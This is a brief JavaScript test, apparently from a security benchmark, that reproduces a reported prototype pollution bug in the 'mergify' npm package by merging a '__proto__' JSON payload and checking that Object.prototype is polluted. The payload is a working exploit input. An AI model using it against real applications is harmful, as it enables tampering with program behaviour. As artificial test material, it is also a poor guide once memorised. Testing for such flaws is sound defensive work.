//https://hackerone.com/reports/439098
test("prototype pollution in mergify", () => {
  const mergify = require("mergify");
  const payload = process.env.SECBENCH_PAYLOAD || (process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');

  expect({}.polluted).toBe(undefined);

  mergify({}, JSON.parse(payload));

  expect({}.polluted).toBe("yes");
});
